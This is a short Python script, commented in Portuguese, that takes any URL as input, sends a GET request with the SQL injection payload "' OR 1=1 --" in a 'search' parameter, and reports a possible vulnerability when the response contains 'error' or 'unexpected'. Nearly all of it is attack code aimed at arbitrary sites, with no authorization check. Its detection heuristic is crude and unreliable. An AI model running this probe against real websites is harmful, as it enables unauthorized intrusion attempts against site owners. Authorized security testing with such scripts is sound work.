import requests

# URL alvo
url = input("")

# Payload de teste (tentando injetar código SQL)
payload = "' OR 1=1 --"

# Parâmetros de exemplo (dependendo da URL e da forma como a consulta é feita)
params = {'search': payload}

# Fazendo a requisição
response = requests.get(url, params=params)

# Verificando a resposta
if "error" in response.text.lower():
    print("\033[91m[INFO] Possível vulnerabilidade de SQL Injection detectada. \033[97m")
elif "unexpected" in response.text.lower():
    print("\033[0m [INFO] O site pode estar vulnerável a SQL Injection. \033[97m")
else:
    print("\033[32m [INFO] Nenhuma vulnerabilidade detectada. \033[97m")

print(f"\033[34mStatus da requisição: {response.status_code}\033[97m")  # Displays the HTTP status code
